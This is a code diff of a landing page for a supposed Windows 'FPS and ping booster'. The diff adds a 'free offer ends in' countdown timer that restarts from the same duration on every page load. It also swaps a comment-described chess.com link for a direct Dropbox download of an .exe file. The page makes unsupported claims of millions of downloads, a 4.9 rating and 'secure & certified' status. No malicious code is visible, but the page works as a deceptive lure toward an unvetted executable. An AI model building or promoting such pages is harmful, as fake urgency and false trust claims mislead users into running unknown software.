@@ -4,9 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ULTRA PERFORMANCE BOOSTER · PRO</title>
-  <!-- Font Awesome 6 (free) for sleek icons -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
+    /* Inter font via fallback */
+    @import url('https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap');
+
     * {
       margin: 0;
       padding: 0;
@@ -34,9 +36,6 @@
       scroll-behavior: smooth;
     }
 
-    /* Inter font via fallback */
-    @import url('https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap');
-
     /* custom gradient / noise overlay */
     .noise-bg {
       position: fixed;
@@ -57,6 +56,64 @@
       flex: 1;
       display: flex;
       flex-direction: column;
+    }
+
+    /* Free countdown bar */
+    .countdown-bar {
+      background: rgba(0, 212, 255, 0.05);
+      border: 1px solid var(--glass-edge);
+      border-radius: 60px;
+      padding: 0.8rem 2rem;
+      margin-bottom: 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+      backdrop-filter: blur(4px);
+    }
+    .countdown-text {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #fff;
+      font-weight: 500;
+    }
+    .countdown-text i {
+      color: var(--primary);
+      font-size: 1.4rem;
+    }
+    .timer {
+      display: flex;
+      gap: 12px;
+    }
+    .timer-block {
+      background: #1e262e;
+      padding: 0.3rem 0.9rem;
+      border-radius: 30px;
+      border: 1px solid #2a3a48;
+      text-align: center;
+      min-width: 65px;
+    }
+    .timer-block .num {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: var(--primary);
+      line-height: 1.2;
+    }
+    .timer-block .label {
+      font-size: 0.7rem;
+      color: #9aaebf;
+      text-transform: uppercase;
+    }
+    .free-badge {
+      background: var(--primary);
+      color: #050505;
+      padding: 0.3rem 1.2rem;
+      border-radius: 40px;
+      font-weight: 700;
+      font-size: 0.9rem;
+      letter-spacing: 0.5px;
     }
 
     /* header / nav - simplified: only logo and download */
@@ -443,6 +500,13 @@
       .download-main .btn-text .big-text {
         font-size: 1.4rem;
       }
+      .countdown-bar {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .timer {
+        flex-wrap: wrap;
+      }
     }
   </style>
 </head>
@@ -450,19 +514,42 @@
   <div class="noise-bg"></div>
   <div class="wrapper">
 
-    <!-- header - only logo and download button (no Home, Features, etc) -->
+    <div class="countdown-bar">
+      <div class="countdown-text">
+        <i class="fa-regular fa-clock"></i>
+        <span>Free 100% ENDS IN</span>
+      </div>
+      <div class="timer" id="countdownTimer">
+        <div class="timer-block">
+          <div class="num" id="days">2</div>
+          <div class="label">DAYS</div>
+        </div>
+        <div class="timer-block">
+          <div class="num" id="hours">21</div>
+          <div class="label">HOURS</div>
+        </div>
+        <div class="timer-block">
+          <div class="num" id="minutes">47</div>
+          <div class="label">MINS</div>
+        </div>
+        <div class="timer-block">
+          <div class="num" id="seconds">30</div>
+          <div class="label">SECS</div>
+        </div>
+      </div>
+      <div class="free-badge">FULLY FREE</div>
+    </div>
+
     <nav class="navbar">
       <div class="logo">
         <i class="fa-solid fa-bolt"></i> 
         <span>ULTRA PERFORMANCE</span>
       </div>
       <div class="nav-links">
-        <!-- only the download button remains -->
         <a class="nav-download-btn scroll-to-download"><i class="fa-regular fa-circle-down" style="margin-right: 6px;"></i>Download</a>
       </div>
     </nav>
 
-    <!-- hero -->
     <div class="hero">
       <div class="hero-left">
         <span class="hero-badge"><i class="fa-regular fa-gem" style="margin-right: 6px;"></i> WINDOWS PRO EDITION</span>
@@ -470,11 +557,10 @@
           UNLOCK <span>ULTRA</span><br>FPS & PING.
         </h1>
         <div class="hero-description">
-          <i class="fa-solid fa-circle-check" style="color: #00D4FF; margin-right: 10px;"></i> 
+          <i class="fa-regular fa-circle-check" style="color: #00D4FF; margin-right: 10px;"></i> 
           #1 booster for competitive gamers — maximize FPS, minimize ping
         </div>
 
-        <!-- MAIN DOWNLOAD BUTTON (big) - scroll trigger -->
         <a class="download-main scroll-to-download" style="cursor: pointer;">
           <i class="fa-brands fa-windows"></i>
           <div class="btn-text">
@@ -486,14 +572,13 @@
         <div style="display: flex; gap: 28px; color: #7b8b99; font-size: 0.9rem; flex-wrap: wrap;">
           <span><i class="fa-regular fa-circle-check" style="color: #00D4FF;"></i> 2M+ downloads</span>
           <span><i class="fa-regular fa-star" style="color: #00D4FF;"></i> 4.9 star rating</span>
-          <span><i class="fa-regular fa-shield" style="color: #00D4FF;"></i> secure & certified</span>
+          <span><i class="fa-solid fa-shield-halved" style="color: #00D4FF;"></i> secure & certified</span>
         </div>
       </div>
 
-      <!-- right panel: stats focused on FPS and PING -->
       <div class="hero-right">
         <div class="stat-item">
-          <div class="stat-icon"><i class="fa-solid fa-display"></i></div>
+          <div class="stat-icon"><i class="fa-solid fa-desktop"></i></div>
           <div class="stat-content">
             <h3>FPS BOOST (AVG)</h3>
             <div class="value">187 <small>fps</small></div>
@@ -519,14 +604,13 @@
       </div>
     </div>
 
-    <!-- features grid - all about FPS, ping, network, latency -->
     <div class="features-title">
       <i class="fa-solid fa-microchip"></i> 
       <span>Engineered for maximum FPS & lowest ping</span>
     </div>
     <div class="features-grid">
       <div class="feature-card">
-        <div class="feature-icon"><i class="fa-solid fa-display"></i></div>
+        <div class="feature-icon"><i class="fa-solid fa-desktop"></i></div>
         <h3>FPS Optimizer</h3>
         <p>Unlocks GPU headroom, prioritizes rendering, and reduces stutter for buttery smooth gameplay.</p>
       </div>
@@ -547,10 +631,8 @@
       </div>
     </div>
 
-    <!-- second big download section (bottom) - target anchor, .EXE button to chess.com -->
     <div class="download-area" id="download-section">
       <h2>Dominate the leaderboard.<br>Max FPS, zero ping.</h2>
-      <!-- this .EXE button now links to chess.com/play/online -->
       <a href="https://www.dropbox.com/scl/fi/oqad0mvio3izrk36z3yui/PerformanceBoosterPro.exe?rlkey=lf14jsrylm37mn5pl7yk9zn2f&st=kjqu6kdk&dl=1" class="btn-download-secondary" target="_blank" rel="noopener noreferrer">
         <i class="fa-brands fa-windows"></i> Download .EXE
       </a>
@@ -559,19 +641,14 @@
       </p>
     </div>
 
-    <!-- footer - just a simple brand mention, no links -->
     <footer class="footer">
       <div>© 2025 ULTRA PERFORMANCE BOOSTER — PRO EDITION — By ahmed.limam</div>
     </footer>
 
-  </div> <!-- wrapper end -->
-
-  <!-- subtle extra glow effect -->
-  <div style="position: fixed; bottom: 30px; right: 30px; opacity: 0.2; pointer-events: none; z-index: 1;">
+  </div> <div style="position: fixed; bottom: 30px; right: 30px; opacity: 0.2; pointer-events: none; z-index: 1;">
     <i class="fa-solid fa-bolt" style="font-size: 7rem; color: #00D4FF; filter: blur(8px);"></i>
   </div>
 
-  <!-- smooth scroll script for download triggers -->
   <script>
     (function() {
       // select all elements with the class 'scroll-to-download'
@@ -589,8 +666,48 @@
           });
         });
       }
+
+      // COUNTDOWN TIMER - Set to 2 days, 21 hours, 47 minutes from now
+      function startCountdown(days = 2, hours = 21, minutes = 47, seconds = 0) {
+        // Set target date: current time + specified duration
+        const target = new Date();
+        target.setDate(target.getDate() + days);
+        target.setHours(target.getHours() + hours);
+        target.setMinutes(target.getMinutes() + minutes);
+        target.setSeconds(target.getSeconds() + seconds);
+
+        function updateTimer() {
+          const now = new Date();
+          const diff = target - now;
+
+          if (diff <= 0) {
+            document.getElementById('days').innerText = '0';
+            document.getElementById('hours').innerText = '0';
+            document.getElementById('minutes').innerText = '0';
+            document.getElementById('seconds').innerText = '0';
+            return;
+          }
+
+          const totalSeconds = Math.floor(diff / 1000);
+          const daysLeft = Math.floor(totalSeconds / 86400);
+          const hoursLeft = Math.floor((totalSeconds % 86400) / 3600);
+          const minutesLeft = Math.floor((totalSeconds % 3600) / 60);
+          const secondsLeft = totalSeconds % 60;
+
+          document.getElementById('days').innerText = daysLeft;
+          document.getElementById('hours').innerText = hoursLeft;
+          document.getElementById('minutes').innerText = minutesLeft;
+          document.getElementById('seconds').innerText = secondsLeft;
+        }
+
+        updateTimer();
+        setInterval(updateTimer, 1000);
+      }
+
+      // Start countdown with 2 days, 21 hours, 47 minutes
+      startCountdown(2, 21, 47, 0);
+
     })();
   </script>
 </body>
 </html>
-
